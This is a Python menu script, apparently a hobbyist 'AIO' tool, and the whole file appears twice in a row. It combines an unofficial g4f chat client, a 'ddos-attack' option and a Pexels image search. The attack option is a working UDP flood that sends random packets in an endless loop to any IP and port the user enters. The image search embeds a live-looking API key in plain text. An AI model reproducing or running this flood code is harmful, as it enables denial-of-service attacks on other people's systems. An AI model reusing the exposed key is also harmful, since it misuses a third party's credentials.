import requests
from PIL import Image
from io import BytesIO

def title():
    print("""
  /$$$$$$  /$$$$$$  /$$$$$$ 
 /$$__  $$|_  $$_/ /$$__  $$
| $$  \ $$  | $$  | $$  \ $$
| $$$$$$$$  | $$  | $$  | $$
| $$__  $$  | $$  | $$  | $$
| $$  | $$  | $$  | $$  | $$
| $$  | $$ /$$$$$$|  $$$$$$/
|__/  |__/|______/ \______/ 
                                                                                                                                         
""")
    print("made by @OwrellAI")
    print("https://github.com/OwrellAI/AIO-Software-\n")

def main():
    user_input = input("What do you want to do?: ")

    if user_input.lower() == "command-r+":
        from g4f.client import Client

        def command_r_plus():
            client = Client()

            # Print the title once at the start
            title()

            while True:
                try:
                    user_input = input("< ")

                    if user_input.lower() in ["q", "quit", "exit"]:
                        print("Leaving Command...")
                        break

                    # Sending user input to the AI and getting the response
                    response = client.chat.completions.create(
                        model="command-r+",
                        messages=[{"role": "user", "content": user_input}],
                    )

                    # Print the AI's response
                    print("> ", response.choices[0].message.content)

                except Exception as e:
                    print(f"An error occurred: {e}")

        command_r_plus()

    elif user_input.lower() == "ddos-attack":
        import socket
        import random
        import time

        # Socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)

        # Target
        ip = input("IP Target: ")
        port = int(input("Port: "))

        # Attack
        print("""
         /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$ 
        | $$__  $$| $$__  $$ /$$__  $$ /$$__  $$
        | $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/
        | $$  | $$| $$  | $$| $$  | $$|  $$$$$$ 
        | $$  | $$| $$  | $$| $$  | $$ \____  $$
        | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
        | $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/
        |_______/ |_______/  \______/  \______/ 
                                                    
                                                    
        """)

        # Send packets
        while True:
            sock.sendto(bytes, (ip, port))
            print(f"Sent packet to {ip}:{port}")
            time.sleep(1)

    elif user_input.lower() == "imgsearcher":
        def show_image(url):
            response = requests.get(url)
            if response.status_code == 200:
                img = Image.open(BytesIO(response.content))
                img.show()
            else:
                print(f"Failed to download image from {url}. Status code: {response.status_code}")

        def search_images(query, api_key, per_page=1):
            url = f"https://api.pexels.com/v1/search?query={query}&per_page={per_page}"
            headers = {
                "Authorization": api_key
            }

            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                data = response.json()
                photos = data.get("photos", [])
                if photos:
                    photo_url = photos[0]['url']
                    show_image(photo_url)
                else:
                    print("No images found for the query.")
            else:
                print("Failed to fetch images")

        api_key = "majIfaiIYNVW06Y8PQZhrMkJrQoMqGq4X1ionRRewvk3esDaH1Ejgkhh"
        query = input("Enter search query: ")
        search_images(query, api_key)

    else:
        print("Invalid input!")

if __name__ == "__main__":
    title()
    main()
import requests
from PIL import Image
from io import BytesIO

def title():
    print("""
  /$$$$$$  /$$$$$$  /$$$$$$ 
 /$$__  $$|_  $$_/ /$$__  $$
| $$  \ $$  | $$  | $$  \ $$
| $$$$$$$$  | $$  | $$  | $$
| $$__  $$  | $$  | $$  | $$
| $$  | $$  | $$  | $$  | $$
| $$  | $$ /$$$$$$|  $$$$$$/
|__/  |__/|______/ \______/ 
                                                                                                                                         
""")
    print("made by @OwrellAI")
    print("https://github.com/OwrellAI/AIO-Software-\n")

def main():
    user_input = input("What do you want to do?: ")

    if user_input.lower() == "command-r+":
        from g4f.client import Client

        def command_r_plus():
            client = Client()

            # Print the title once at the start
            title()

            while True:
                try:
                    user_input = input("< ")

                    if user_input.lower() in ["q", "quit", "exit"]:
                        print("Leaving Command...")
                        break

                    # Sending user input to the AI and getting the response
                    response = client.chat.completions.create(
                        model="command-r+",
                        messages=[{"role": "user", "content": user_input}],
                    )

                    # Print the AI's response
                    print("> ", response.choices[0].message.content)

                except Exception as e:
                    print(f"An error occurred: {e}")

        command_r_plus()

    elif user_input.lower() == "ddos-attack":
        import socket
        import random
        import time

        # Socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)

        # Target
        ip = input("IP Target: ")
        port = int(input("Port: "))

        # Attack
        print("""
         /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$ 
        | $$__  $$| $$__  $$ /$$__  $$ /$$__  $$
        | $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/
        | $$  | $$| $$  | $$| $$  | $$|  $$$$$$ 
        | $$  | $$| $$  | $$| $$  | $$ \____  $$
        | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
        | $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/
        |_______/ |_______/  \______/  \______/ 
                                                    
                                                    
        """)

        # Send packets
        while True:
            sock.sendto(bytes, (ip, port))
            print(f"Sent packet to {ip}:{port}")
            time.sleep(1)

    elif user_input.lower() == "imgsearcher":
        def show_image(url):
            response = requests.get(url)
            if response.status_code == 200:
                img = Image.open(BytesIO(response.content))
                img.show()
            else:
                print(f"Failed to download image from {url}. Status code: {response.status_code}")

        def search_images(query, api_key, per_page=1):
            url = f"https://api.pexels.com/v1/search?query={query}&per_page={per_page}"
            headers = {
                "Authorization": api_key
            }

            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                data = response.json()
                photos = data.get("photos", [])
                if photos:
                    photo_url = photos[0]['url']
                    show_image(photo_url)
                else:
                    print("No images found for the query.")
            else:
                print("Failed to fetch images")

        api_key = "majIfaiIYNVW06Y8PQZhrMkJrQoMqGq4X1ionRRewvk3esDaH1Ejgkhh"
        query = input("Enter search query: ")
        search_images(query, api_key)

    else:
        print("Invalid input!")

if __name__ == "__main__":
    title()
    main()
